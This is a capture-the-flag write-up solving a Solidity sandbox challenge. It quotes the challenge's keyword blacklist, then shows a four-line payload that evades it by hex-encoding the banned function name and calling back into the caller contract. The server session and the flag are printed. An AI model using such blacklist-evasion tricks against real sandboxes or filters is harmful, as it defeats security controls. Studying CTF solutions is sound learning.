# Solidity Jail 1 write-up (WWCTF 2025)

**Name:** Solidity Jail 1

**Description:** Bash Jail? Boring. Pyjail? Too Common.

Introducing for the first time, Solidity Jail!\
Make a contract to read the flag!

**Type:** Blockchain

**Difficulty:** Medium?

**Points:** 395

**Author:** zeptoide

**Files:** [Jail.sol](/Solidity%20Jail%201/Jail.sol) [jailTalk.py](/Solidity%20Jail%201/jailTalk.py)

## Analysis

It is the last hour of the CTF. The scoreboard is frozen, and I'm trying to squeeze out every last point where I can.

I lay my eye on "Solidity Jail 1". Its points drop slightly, just like when I first found "bf jail". After all, it presents itself as an entry-level challenge on Solidity (which is new to me).

"Maybe I can just learn it on the fly." I thought to myself.

With that thought in mind, I start dissecting [jailTalk.py](/Solidity%20Jail%201/jailTalk.py). The core logic quickly shows itself:
```python
print("Enter the body of main() (end with three blank lines):")
lines = []
empty_count = 0
while True:
    try:
        line = input()
    except EOFError:
        break
    if line.strip() == "":
        empty_count += 1
    else:
        empty_count = 0
    if empty_count >= 3:
        lines = lines[:-2]
        break
    lines.append(line)

body = "\n".join(f"        {l}" for l in lines)

if not all(ch in string.printable for ch in body):
    raise ValueError("Non-printable characters detected in contract.")

blacklist = [
    "flag",
    "transfer",
    "address",
    "this",
    "block",
    "tx",
    "origin",
    "gas",
    "fallback",
    "receive",
    "selfdestruct",
    "suicide"
]
if any(banned in body for banned in blacklist):
    raise ValueError(f"Blacklisted string found in contract.")


source = f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Solution {{
    function main() external returns (string memory) {{
{body}
    }}
}}
"""
```
So I need to craft a Solidity payload that can pass the blacklist. Let's get googling and learning...

Headache. Only headache. There are simply too many basics to get down; one hour is clearly not enough. Also, none of the example has a `main()` function! There's nothing I can quickly grab and get it to work.

In despair, I finally shouted:
> _Help me, GPTTTTTT!!_

I feed [Jail.sol](/Solidity%20Jail%201/Jail.sol) to GPT and ask for its opinion. It quickly spits out a "working" example:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GetFlag {
    function main() public returns (string memory) {
        // Address of BytecodeRunner is msg.sender (because it called us)
        address runner = msg.sender;

        // Function selector for `flag()`
        bytes memory callData = abi.encodeWithSignature("flag()");

        (bool success, bytes memory data) = runner.staticcall(callData);
        require(success, "Could not read flag");

        return abi.decode(data, (string));
    }
}
```
(Don't mind the mismatched contract name. I didn't feed it [jailTalk.py](/Solidity%20Jail%201/jailTalk.py).)

Feeding the blacklist word makes GPT overcomplicate things, so I think it's time for manual cleanup.

The code is actually very manageable: the payload is just 5 lines after cleaning up all comments and wrappers:
```solidity
address runner = msg.sender;
bytes memory callData = abi.encodeWithSignature("flag()");
(bool success, bytes memory data) = runner.staticcall(callData);
require(success, "Could not read flag");
return abi.decode(data, (string));
```
Some simple changes can be made now. The keyword `address` is not allowed, but we recognize that `runner` is just a "renaming" of `msg.sender`. Coder's instinct tells us maybe we can just merge them:
```solidity
bytes memory callData = abi.encodeWithSignature("flag()");
(bool success, bytes memory data) = msg.sender.staticcall(callData);
require(success, "Could not read flag");
return abi.decode(data, (string));
```
The only blacklisted word remaining is `flag`. Fixing the one on line 3 is easy, since it is just a message:
```solidity
bytes memory callData = abi.encodeWithSignature("flag()");
(bool success, bytes memory data) = msg.sender.staticcall(callData);
require(success, "Sadge");
return abi.decode(data, (string));
```
The one in the first line is a bit tough, since it is the exact thing we want to execute. But that turns out to be also easy: I quickly googled "solidity hex to string", and AI Overview said that hex to string conversion in Solidity is implicit, so:

## Solution

Final payload:
```solidity
bytes memory callData = abi.encodeWithSignature(hex"666c61672829");
(bool success, bytes memory data) = msg.sender.staticcall(callData);
require(success, "Sadge");
return abi.decode(data, (string));
```
```
$ nc chal.wwctf.com 9499
Enter the body of main() (end with three blank lines):
bytes memory callData = abi.encodeWithSignature(hex"666c61672829");
(bool success, bytes memory data) = msg.sender.staticcall(callData);
require(success, "Sadge");
return abi.decode(data, (string));



Final contract with inserted main() body:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract Solution {
    function main() external returns (string memory) {
        bytes memory callData = abi.encodeWithSignature(hex"666c61672829");
        (bool success, bytes memory data) = msg.sender.staticcall(callData);
        require(success, "Sadge");
        return abi.decode(data, (string));
    }
}
[True, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00(wwf{y0u_4r3_7h3_7ru3_m4573r_0f_s0l1d17y}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
```

**Flag:** `wwf{y0u_4r3_7h3_7ru3_m4573r_0f_s0l1d17y}`

And that's how I clutched the last solve of our team, half an hour before the CTF ended.

## Afterword

This challenge is manageable by AI, so I stole the solve from AI in some sense.

"Solidity Jail 2" is the real challenge. The blacklist is more comprehensive. In particular, both AI and I could not get around using the word `call`, so solving this challenge requires some serious Solidity knowledge. I truly admire the teams that solved it. Please have a look at their write-ups on "Solidity Jail 2".
